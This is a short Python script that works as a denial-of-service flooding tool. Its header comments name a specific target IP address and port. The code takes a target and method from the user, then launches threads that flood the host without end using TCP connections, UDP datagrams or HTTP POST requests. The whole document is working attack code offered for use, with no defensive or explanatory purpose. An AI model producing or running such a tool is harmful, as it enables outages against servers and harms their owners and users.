# ddos Ip : 123.30.157.136:8484
# ddos Port : 8484
# ddos Time : 1000
# ddos Method : TCP
# ddos Method : UDP
# ddos Method : HTTP

import socket
import random
import threading
import time
import sys
import os
import re
import urllib.request
import urllib.parse
import urllib.error
import http.client

os.system("clear")

ip = str(input(" Ip:"))
port = int(input(" Port:"))
choice = str(input(" Method:"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
    data = random._urandom(1024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Sent")
        except:
            s.close()
            print("[!] Error")

def run2():
    data = random._urandom(16)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" Sent")
        except:
            print("[!] Error")

def run3():
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            params = urllib.parse.urlencode({'spam': 1, 'name': 'test'})
            headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
            conn = http.client.HTTPConnection(ip,port)
            conn.request("POST", "", params, headers)
            response = conn.getresponse()
            print(i +" Sent")
            conn.close()
        except:
            print("[!] Error")

for y in range(threads):
    if choice == 'TCP':
        th = threading.Thread(target = run)
        th.start()
    elif choice == 'UDP':
        th = threading.Thread(target = run2)
        th.start()
    elif choice == 'HTTP':
        th = threading.Thread(target = run3)
        th.start()
    else:
        print('Wrong Method')
        sys.exit()
